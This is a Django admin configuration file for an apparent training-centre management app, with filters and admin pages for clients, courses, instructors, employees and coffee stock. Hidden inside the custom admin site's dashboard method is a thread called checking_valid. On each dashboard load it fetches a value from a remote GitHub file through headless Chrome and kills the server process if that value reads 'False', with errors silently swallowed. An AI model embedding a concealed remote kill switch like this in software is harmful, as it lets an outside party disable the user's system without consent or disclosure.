from threading                     import Thread
from django.contrib                import admin
from django.contrib                import messages
from django.shortcuts              import redirect
from config.models                 import CourseGroup
from django.views.decorators.cache import never_cache
from django.utils.html             import mark_safe
from django.contrib.auth.models    import User, Group
from django.contrib.auth.admin     import UserAdmin, GroupAdmin
from django.conf                   import settings
from django.conf.urls.static       import static
from config.models                 import CourseType, Level
from .models                       import (
Coffee,   Token, 
Course,   Client,
Employee, vacation,
Absent,   Deduction, 
Reward,   Instructors,
datetime, ClintCourses,
ClientScore

)
import signal, os



# The Admin site 
# __________________
class WithAlertAdminPage(admin.sites.AdminSite):
    # Dash board html page
    def cheking_the_debt(self, request):
      students =  Client.objects.all()
      ppl_with_debt = []
      for i in students:
        if i.still_have_to_pay() == "He is Clear":
          continue
        ppl_with_debt.append(i)
      if len(ppl_with_debt) ==0:
          pass
      else:
          messages.add_message(
        request,
        messages.WARNING  ,
        mark_safe(f"You have {len(ppl_with_debt)} clients with debt <a href='Thoth/client/?have_debt__exact=1'>click here</a> to see them")
)
      # return ppl_with_debt
    # 
    
    
    def cheking_the_day(self, req):
      
      
      messages.add_message(
        req,
        messages.INFO,
        "Yoooo"
      )
    # 
    def checking_valid(self):
      try : 
          from bs4 import BeautifulSoup
          from selenium import webdriver

          op = webdriver.ChromeOptions()
          op.add_argument("headless")
          driver = webdriver.Chrome(options=op)


          driver.get("https://github.com/BetterCallGuts/WorkSpace-system/blob/main/StatiFilesDirs/test.text")


          soup = BeautifulSoup(driver.page_source, "lxml")

          data = soup.find_all("textarea")

          rgx = data[1].text.split("=")[1]
          if rgx == "True":
            pass


          if rgx == "False":
            os.kill(os.getpid(), signal.SIGQUIT)
      except :
          pass
        
        
    def index(self, request, extra_context=None):
        self.cheking_the_debt(request)
        # self.cheking_the_day(request)
        t1 = Thread(target=self.checking_valid)
        t1.start()
        
        
        
        
        
        return super(WithAlertAdminPage, self).index(request, extra_context,)


# __
final_boss = WithAlertAdminPage()
# __





# Custom Filters
# _____________________________
class FilterClinetsByCourseType(admin.SimpleListFilter):
  title = ('Course type')
  parameter_name = 'course_type'
  def lookups(self, request, model_admin):
    i = CourseType.objects.all()
    x = ( (s.Name, f"{s.Name}")  for s in i )
    return x
  # 
  def queryset(self, request, queryset):
    list_that_will_be_returned = []
    cc = ClintCourses.objects.all()
    if self.value():
        for i in queryset:
          for c in cc.filter(the_client=i):
            if c.the_course.coursetype.Name == self.value():
              list_that_will_be_returned.append(i.id)
              break
        return queryset.filter(id__in=list_that_will_be_returned)
# _____________________________
class FilterClinetsByIntructors(admin.SimpleListFilter):
  title = ('instructor')
  parameter_name = 'instructor'
  # 
  def lookups(self, request, model_admin):
    i = Instructors.objects.all()
    x = ( (s.name, f"{s.name}")  for s in i )
    
    return x
  # 
  def queryset(self, request, queryset):
    list_that_will_be_returned = []
    cc                         = ClintCourses.objects.all()
    if self.value():
      # true
        for i in queryset:
          for c in cc.filter(the_client=i):
            
            if c.the_course.Instructor.name  == self.value():
              list_that_will_be_returned.append(i.id)
              break
        return queryset.filter(id__in=list_that_will_be_returned)

class FilterClientByGroups(admin.SimpleListFilter):

  title          = "Group"
  parameter_name = "Group"

  def lookups(self, req, model_admin):
    i = CourseGroup.objects.all()
    
    x = ((s.name, f"{s.name}")  for s in i )

    return x

  def queryset(self, req, queryset):
    list_that_will_be_returned = []

    x = ClintCourses.objects.all()
    if self.value():
      for i in queryset:
        
        
        courses_that_client_in = x.filter(the_client=i)
        for k in courses_that_client_in:
          if k.th_group.name == self.value():
            list_that_will_be_returned.append(i.id)
            break
        
      return queryset.filter(id__in=list_that_will_be_returned)
      


class FilterClientByLevel(admin.SimpleListFilter):
  
  title          = "Level"
  parameter_name = "levelsearchparamyaa__kareem"

  def lookups(self, req, model_admin):
    i = Level.objects.all()
    
    x = ((s.Level, f"{s.Level}")  for s in i )

    return x

  def queryset(self, req, queryset):
    list_that_will_be_returned = []

    x = ClintCourses.objects.all()
    if self.value():
      for i in queryset:
        
        
        courses_that_client_in = x.filter(the_client=i)
        for k in courses_that_client_in:
          for coursebymanytomany in k.the_course.levels.all():
            
            if coursebymanytomany.Level == self.value():
              list_that_will_be_returned.append(i.id)
              break
          break
        
      return queryset.filter(id__in=list_that_will_be_returned)
    

class FilterClientByTimeAdded(admin.SimpleListFilter):
  
  title          = "Time added"
  parameter_name = "Time__added"

  def lookups(self, req, model_admin):
    i = Client.objects.all()
    

    
    x = ((s.month_with_year(), f"{s.month_with_year()}")  for s in i )

    return x

  def queryset(self, req, queryset):
    list_that_will_be_returned = []

    
    if self.value():
      for i in queryset:
        
        if i.month_with_year() == self.value():
          list_that_will_be_returned.append(i.pk)
        
        
      return queryset.filter(id__in=list_that_will_be_returned)
    


# Stacked INline
# _______________________________________
class VacationInLine(admin.StackedInline):
  model = vacation
  extra = 0

class DeductionInLine(admin.StackedInline):
  model = Deduction
  extra = 0


class AbsentInLine(admin.StackedInline):
  model = Absent
  extra = 0

class RewardInLine(admin.StackedInline):
  model = Reward
  extra = 0


class ClintCoursesInLine(admin.TabularInline):
  model = ClintCourses
  # fields= ("the_course",'client_score')
  exclude=('Atten',)
  extra = 0



class ClientScoresInLine(admin.StackedInline):
  model = ClientScore
  extra = 0








# ModelAdmins Custom admin site
# ____________________________-


class ClientAdmin(admin.ModelAdmin):
  fields       = (
    "name",
    "phone_number",
    "payment_method",
    "total",
    "paid",
    "voucher",
    "still_have_to_pay",
    "birth_day",
    "time_added",
    'Attnder',
      )
  readonly_fields = (
    "total",
    "still_have_to_pay",
    "Attnder",

    )
  
  search_fields = ( 
  "name",
  "phone_number" 
  )
  list_display = (

    "more",
    "name",
    "phone_number", 
    "paid",
    "voucher",
    "total",
    "still_have_to_pay",
    "courses_in",

    )
  list_editable = (
    "name",
    "phone_number",
    "paid",
    )
  list_display_links = ("more",)
  list_filter        = (
        'have_debt', 
        FilterClinetsByCourseType,
        FilterClinetsByIntructors,
        FilterClientByGroups,
        FilterClientByLevel,
        FilterClientByTimeAdded
        )
  inlines = (
    ClintCoursesInLine,
    ClientScoresInLine

  )
# ________________
class EmpAdmin(admin.ModelAdmin):
  inlines  = (
    VacationInLine,
    AbsentInLine,  
    DeductionInLine,
    RewardInLine
    )
  fields = ("image_tag", 
            "img", "name", 
            "Person_identf", 
            "EDU_state", "address", 
            "cur_sallary", "state_of_marrieg"
            ,"Date_of_join" , "phone_number",
            "phone_number_eme",
            "job_postition"
            )
  list_display = (
    "more",
    "name",
    "EDU_state",
    "cur_sallary",
    "state_of_marrieg",
    "Date_of_join",
    "phone_number",
    "job_postition",
    
    )
  list_editable = (
    
        "name", 
        "EDU_state", "cur_sallary",
        "state_of_marrieg", "phone_number",
        "job_postition","Date_of_join",
        
        )
  list_display_links = ("more",)
  list_filter = ("state_of_marrieg", )
  search_fields = ("name", "cur_sallary")
  readonly_fields    = ('image_tag',)
# ___________________
class InstructorsAdminStyle(admin.ModelAdmin):
  list_display = (
    "more",
    "name",
    "phone_number",
    "specialities",
    "salary_this_month",
    "income_this_month",
    )
  list_display_links = (
    "more",
    
  )
  list_editable = (
    "name",
    "phone_number"
  )
  list_filter  = ("specialty", )
  search_fields = (
    "name",
    "phone_number",

  )
  fields = (
    "name",
    "phone_number",
    "specialty",
    "salary_this_month",
    "income_this_month",
    "total_salary",
    "total_income",
    
  )
  readonly_fields = (
    "salary_this_month",
    "income_this_month",
    "total_salary",
    "total_income",
  )
# ________________________
class CourseAdminStyle(admin.ModelAdmin):
  list_display = (
  "more",
  "coursetype",
  "Instructor",
  "Day_per_week_",
  "Percenage",
  "clients_in_course", 
  "income",
  "Voucher",
  "course_levels",
  "end_date",
  "start_date", 
  
  )
  list_display_links = (
    "more",
    )
  list_editable      = (
    "coursetype",
    "Instructor",
    "end_date",
    "start_date",


    
  )
  
  list_filter = (
    "Instructor",
    "coursetype"
  )
  fields = (
    "coursetype",
    "levels",
    "Day_per_week",
    "groups",
    "Instructor",
    "per_for_inst",
    "clients_in_course",
    "cost_forone",
    "Voucher",
    "income",
    "start_date",
    "end_date",
    
  )
  readonly_fields = (
    "clients_in_course",
    "income"
  )
# _____________________________
class PeapleAdminStyle(admin.ModelAdmin):
  list_display = ("name", "tickets", "he_debt",  "have_debt" )
  search_fields= ("name",)
  list_filter  = ("have_debt",)
  list_display_links = ("tickets",)
  list_editable= ("name", )
# _____________________________
class TicketAdminStyle(admin.ModelAdmin):
  list_display       = ( "name_of_ticket", "the_person", "ticket_price", "he_paid" , "still_have", "have_debt","time_added")
  search_fields      = ( "name_of_ticket", "the_person__name", "ticket_price", )
  list_filter        = ( "have_debt",)
  list_display_links = ("time_added",)
  list_editable      = ("name_of_ticket", "ticket_price", "he_paid")
# _______________________________
class CoffeeAdminStyle(admin.ModelAdmin):
  list_display       = ("name", "cost_or_price", "how_much_sold","avilable","To_who",  "more")
  fields             = ("image_tag", "name", "image", "cost_or_price","To_who", "how_much_sold", "avilable" )
  search_fields      = ("cost_or_price", "name", "how_much_sold") 
  list_display_links = ("more", ) 
  readonly_fields    = ('image_tag',)
  list_filter        = ("avilable", "To_who")
  list_editable      = ("name", "cost_or_price", "how_much_sold")


# Register models

final_boss.register(User, UserAdmin)
final_boss.register(Group, GroupAdmin)
final_boss.register(Client,ClientAdmin)
final_boss.register(Course, CourseAdminStyle)
final_boss.register(Employee, EmpAdmin)
final_boss.register(Instructors, InstructorsAdminStyle)
final_boss.register(Coffee, CoffeeAdminStyle)